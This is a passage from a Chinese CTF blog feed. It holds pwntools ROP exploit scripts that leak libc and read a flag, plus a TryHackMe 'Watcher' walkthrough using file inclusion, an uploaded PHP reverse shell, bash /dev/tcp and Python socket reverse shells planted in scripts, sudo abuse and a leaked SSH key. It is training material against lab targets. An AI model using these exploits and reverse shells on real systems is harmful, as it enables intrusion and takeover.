class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from pwn <span class="keyword">import</span>*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span></span><br><span class="line"><span class="function">libc</span>=<span class="built_in">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=<span class="built_in">ELF</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;pwn-d929761f60.challenge.xctf.org.cn&quot;</span>, 9999, ssl=True)</span></span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0000000000401393</span></span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+<span class="built_in">p64</span>(rdi)+<span class="built_in">p64</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(<span class="number">0x4012F0</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(read)+<span class="built_in">p64</span>(<span class="number">0x4012EE</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">orw  = b<span class="number">&#x27;</span>/flag\x00\x00\x00<span class="number">&#x27;</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(bss)  #/flag的字符串位置，要改</span><br><span class="line">orw += <span class="built_in">p64</span>(rsi) + <span class="built_in">p64</span>(<span class="number">0</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(open_)</span><br><span class="line"></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">3</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #读入flag的位置</span><br><span class="line">orw += <span class="built_in">p64</span>(read)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">1</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #读入flag的位置</span><br><span class="line">orw += <span class="built_in">p64</span>(write)</span><br><span class="line"></span><br><span class="line"><span class="meta">#pr(hex(len(orw)))</span></span><br><span class="line">p.<span class="built_in">send</span>(orw)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>日常检查</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/桌面/啊布拉布拉/11111/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3f7000)</span><br><span class="line">bbq@ubuntu:~/桌面/啊布拉布拉/11111$ </span><br></pre></td></tr></table></figure><p>两道题几乎一样，但是这道题多了几个绕过和伪随机数绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwn-ecdfbe9bc0.challenge.xctf.org.cn&quot;, 9999, ssl=True)</span></span><br><span class="line">p=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xun</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Input the authentication code:&#x27;</span>)</span><br><span class="line">       <span class="comment">#payload = str((elf1.rand()%100) + 1)</span></span><br><span class="line">       <span class="comment">#p.send(payload)</span></span><br><span class="line">        p.send(p64(elf1.rand()%<span class="number">100</span>+<span class="number">1</span>))</span><br><span class="line">       </span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">     </span><br><span class="line">       </span><br><span class="line">rdi=<span class="number">0x0000000000401893</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#与题目相同以时间为种子</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+p64(rdi)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(<span class="number">0x00000000040177B</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#print(hex(libc_base))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#与题目相同以时间为种子</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Note: &quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#rl(&quot;lets move and pwn!&quot;)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x100</span>)+p64(bss)+p64(rsi)+p64(bss)+p64(read)+p64(<span class="number">0x0004013EE</span>)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">orw  = <span class="string">b&#x27;/flag\x00\x00\x00&#x27;</span></span><br><span class="line">orw += p64(rdi) + p64(bss)  <span class="comment">#/flag的字符串位置，要改</span></span><br><span class="line">orw += p64(rsi) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(open_)</span><br><span class="line"></span><br><span class="line">orw += p64(rdi) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(read)</span><br><span class="line">orw += p64(rdi) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(rdx_r12) + p64(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += p64(rsi)+p64(bss+<span class="number">0x200</span>) <span class="comment">#读入flag的位置</span></span><br><span class="line">orw += p64(write)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(len(orw)))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(orw)))</span><br><span class="line">p.send(orw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Competition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Watcher</title>
      <link href="/posts/837dcb87.html"/>
      <url>/posts/837dcb87.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.76.81</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.76.81</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132502836-1887610598.png" alt="image-20241021132444064"></p><p>发现开放21，22，80端口</p><h2 id="21端口"><a href="#21端口" class="headerlink" title="21端口"></a>21端口</h2><p>尝试一下匿名登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132601829-412050595.png" alt="image-20241021132544221"></p><p>匿名登陆失败</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132647834-1011735877.png" alt="image-20241021132630028"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132809242-1024503247.png" alt="image-20241021132751518"></p><p>随便点击后发现在url处疑似存在文件包含，尝试利用一下</p><p><code>/post.php?post=/etc/passwd</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021132848048-1949569944.png" alt="image-20241021132830423"></p><p>此处确实存在文件包含</p><p>再扫描一下目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://10.10.76.81/ -w /usr/share/wordlists/dirb/common.txt</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133255264-514546742.png" alt="image-20241021133237741"></p><ul><li><code>robots.txt</code></li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133341367-1636037732.png" alt="image-20241021133323903"></p><p>找到俩文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133429703-900456467.png" alt="image-20241021133412280"></p><p>其中一个是flag1</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133523610-110842426.png" alt="image-20241021133506063"></p><p>另一个无法访问，但是可以用之前发现的文件包含读取文件</p><p><code>/post.php?post=secret_file_do_not_read.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021133606595-1706470773.png" alt="image-20241021133549160"></p><p>发现另一重要目录<code>/home/ftpuser/ftp/files</code>，同时最后面像是一组用户名密码<code>ftpuser:givemefiles777</code>，再次尝试登录ftp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp ftpuser@10.10.76.81</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134015974-2036326351.png" alt="image-20241021133958383"></p><p>登陆成功，并找到flag2</p><p>同时files目录就是之前通过任意文件读取找到的目录 </p><h1 id="获得初始访问权限"><a href="#获得初始访问权限" class="headerlink" title="获得初始访问权限"></a>获得初始访问权限</h1><p>我们可以尝试一下，通过ftp上传的文件，我们知道其绝对路径，就可以通过文件读取进行利用</p><p>先简单尝试一下，准备个php文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134728595-1142287777.png" alt="image-20241021134710659"></p><p>通过ftp上传文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134741144-1604384591.png" alt="image-20241021134723674"></p><p>此时文件的绝对路径就是<code>/home/ftpuser/ftp/files/info.php</code></p><p>再通过浏览器读取该文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021134838040-1001287900.png" alt="image-20241021134820399"></p><p>成功读取，同时php代码也可以被解析，可以利用这个进行反弹shell</p><p>准备好我们的<a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">webshell</a></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135028115-2037447420.png" alt="image-20241021135010474"></p><p>设置好ip和port</p><p>将文件通过ftp上传到服务器上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135329563-557176968.png" alt="image-20241021135312126"></p><p>攻击机设置好监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135347617-1267050085.png" alt="image-20241021135330242"></p><p>浏览器读取并访问我们的shell文件</p><p><code>/post.php?post=/home/ftpuser/ftp/files/php-reverse-shell.php</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135440557-392731814.png" alt="image-20241021135423056"></p><p>拿到shell</p><h1 id="主机用户信息收集"><a href="#主机用户信息收集" class="headerlink" title="主机用户信息收集"></a>主机用户信息收集</h1><p>我们已经获得了<code>www-data</code>权限，能够简单的访问服务器资源，我们需要更进一步的控制这台服务器，就需要继续提升我们的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021135929107-235560157.png" alt="image-20241021135911555"></p><p>在<code>/home/mat</code>下，找到flag5，但是权限不够无法访问，但是可以查看<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140040335-1570935829.png" alt="image-20241021140022894"></p><p>发现可以使用脚本执行，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140152087-852207533.png" alt="image-20241021140134588"></p><p>先切换到交互式shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>发现该文件只提供了三个可以执行的命令，因为文件所属权不属于当前用户，所以无法更改，看下其他用户目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021140642766-1756489674.png" alt="image-20241021140625275"></p><p>还有个<code>note.txt</code>，查看一下，<code>flag4</code>还是没权限查看，同时还注意到有个<code>jobs</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141248050-1048480932.png" alt="image-20241021141230381"></p><p>看样子是想提醒我们查看<code>jobs</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141331204-1164871302.png" alt="image-20241021141313651"></p><p>这是一个脚本文件，里面有cat命令</p><p>继续查看最后一个用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141428606-130895387.png" alt="image-20241021141411017"></p><p>这里只有flag6，仍然无权限读取</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021141806989-1106969102.png" alt="image-20241021141749594"></p><p>在web目录下找到flag3</p><h1 id="提升至user权限"><a href="#提升至user权限" class="headerlink" title="提升至user权限"></a>提升至user权限</h1><h2 id="提升至toby权限"><a href="#提升至toby权限" class="headerlink" title="提升至toby权限"></a>提升至toby权限</h2><p>先检查下<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021144652253-1150780171.png" alt="image-20241021144634735"></p><p>发现可以使用<code>toby</code>执行任何命令<code>sudo</code>无需密码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021144827096-1301873310.png" alt="image-20241021144809623"></p><p>获取<code>toby</code>用户权限，并拿到flag4</p><h2 id="横移至mat权限"><a href="#横移至mat权限" class="headerlink" title="横移至mat权限"></a>横移至mat权限</h2><p>结合之前的信息可知toby的<code>jobs</code>目录中<code>cow.sh</code>是mat的，而我们可以修改该文件，所以我们可以通过写反弹shell获取mat的权限</p><p>攻击机先设置监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021145651665-600001604.png" alt="image-20241021145634230"></p><p>在靶机中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/10.14.90.122/8889 0&gt;&amp;1&quot;</span> &gt;&gt; cow.sh</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021145821073-1468765908.png" alt="image-20241021145803589"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021150121987-290344974.png" alt="image-20241021150104300"></p><p>过一会等定时任务触发，就拿到了mat的shell，并在当前目录找到flag5</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021150554982-1695743786.png" alt="image-20241021150537504"></p><h2 id="横移至will权限"><a href="#横移至will权限" class="headerlink" title="横移至will权限"></a>横移至will权限</h2><p>现在已经拿到了mat的权限，查看一下<code>sudo -l</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021151156011-979402750.png" alt="image-20241021151138536"></p><p>发现我们可以不用密码执行<code>will</code>权限的<code>python3</code>命令</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021151729954-690550907.png" alt="image-20241021151707919"></p><p>结合之前分析的结果可知，我们有权修改<code>cmd.py</code>，无权更改<code>will_script.py</code>，但是<code>will_script.py</code>会调用<code>cmd.py</code>，所以我们就可以通过修改<code>cmd.py</code>的内容，在其中写上反弹shell的python代码，使用<code>will</code>权限的<code>python3</code>执行<code>will_script.py</code>，我们就获得了<code>will</code>的shell</p><p>先在kali上设置监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152055316-382361973.png" alt="image-20241021152037707"></p><p>在靶机上写入python代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.14.90.122&quot;,8899));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span> &gt;&gt; cmd.py</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152258357-765071767.png" alt="image-20241021152240564"></p><p>执行</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152345593-107476696.png" alt="image-20241021152328180"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152358318-1138667333.png" alt="image-20241021152340822"></p><p>获得will的shell</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152454277-1738449844.png" alt="image-20241021152436836"></p><p>找到flag6</p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><p>使用will继续查找敏感文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021152856987-194567056.png" alt="image-20241021152839278"></p><p>在<code>/opt/backups</code>下找到了经过<code>base64</code>编码的key</p><p>将其保存到文件<code>base64_key</code>解码查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153053351-1239828122.png" alt="image-20241021153035699"></p><p>发现是一组私钥，猜测是root的，将私钥保存到文件<code>id_rsa</code>，并赋予<code>600</code>权限便于ssh连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh root@10.10.76.81 -i id_rsa</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153454825-905657572.png" alt="image-20241021153436661"></p><p>获得root权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021153518635-300441644.png" alt="image-20241021153501169"></p><p>在当前目录找到最后一个flag7</p>]]></content>
      
      
      <categories>
          
          <category> TryHackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> THM </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-dogcat</title>
      <link href="/posts/652498eb.html"/>
      <url>/posts/652498eb.html</url>
      
